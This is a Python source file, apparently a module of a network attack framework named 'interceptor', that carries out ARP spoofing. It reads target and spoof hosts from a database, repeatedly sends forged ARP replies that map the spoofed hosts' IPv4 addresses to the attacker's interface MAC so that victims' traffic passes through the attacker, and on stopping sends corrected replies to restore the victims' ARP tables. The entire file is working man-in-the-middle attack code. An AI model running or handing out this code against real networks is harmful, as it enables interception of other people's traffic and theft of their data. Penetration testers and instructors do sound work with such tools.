import threading
import random
import time
from interceptor.net.interfaces import Interface, get_default_interface
import interceptor.net.protocols.arp as arp
import interceptor.db as db
import interceptor.io as io

class Module:
    """Performs ARP spoofing to intercept traffic to one or more hosts
    """
    def __init__(self):
        self._runlock = threading.Lock()

    def run(self, target_ids: list[int] = None, spoof_ids: list[int] = None, interface: Interface = get_default_interface()):
        io.write("Retrieving hosts from database.")
        db_conn = db.open()
        if target_ids is None:
            target_hosts = db.get_all_hosts(db_conn)
        else:
            target_hosts = []
            for i in target_ids:
                host = db.get_host(db_conn, i)
                if host is None:
                    io.write(f"Host {i} not found in database.")
                elif host.mac is None:
                    io.write(f"No MAC in database for host {i}. Cannot attack this host.")
                elif host.ipv4 is None:
                    io.write(f"No IPv4 address in database for host {i}. Cannot attack this host.")
                else:
                    target_hosts.append(host)
        if spoof_ids is None:
            to_spoof = db.get_all_hosts(db_conn)
        else:
            to_spoof = []
            for i in spoof_ids:
                host = db.get_host(db_conn, i)
                if host is None:
                    io.write(f"Host {i} not found in database.")
                elif host.ipv4 is None:
                    io.write(f"No IPv4 address in database for host {i}. Cannot spoof as this host.")
                else:
                    if host.mac is None:
                        io.write(f"Warning: No MAC address in database for host {i}. This host will not be able to be restored in the targets' ARP tables.")
                    to_spoof.append(host)
        
        io.write("Beginning ARP spoofing.")
        pairs = [(s,t) for s in to_spoof for t in target_hosts]
        random.shuffle(pairs)
        while self._runlock.acquire(blocking = False):
            self._runlock.release()
            for spoof_host, target in pairs:
                pkt = arp.ARPPacket(2, target.ipv4, target.mac, spoof_host.ipv4, interface.mac_addr)
                try:
                    pkt.send(target.mac, interface)
                except:
                    io.write(f"Error sending spoofed ARP response to host {target.id} (are you root?)")
                time.sleep(random.random() / 3)
        io.write("Stopping ARP spoofing attack...")
        io.write("Restoring victims' ARP tables...")
        for spoof_host, target in pairs:
            if spoof_host.mac is None:
                io.write(f"Unknown MAC address for host {spoof_host.id}. Cannot restore this host in targets' ARP tables.")
            else:
                pkt = arp.ARPPacket(2, target.ipv4, target.mac, spoof_host.ipv4, spoof_host.mac)
                try:
                    pkt.send(target.mac, interface, spoof_host.mac)
                except:
                    io.write(f"Error sending correct MAC for host {spoof_host.ipv4} to target {target.ipv4}.")
            time.sleep(random.random() / 3)
        io.write("Attack complete.")

    def stop(self):
        self._runlock.acquire(blocking = True)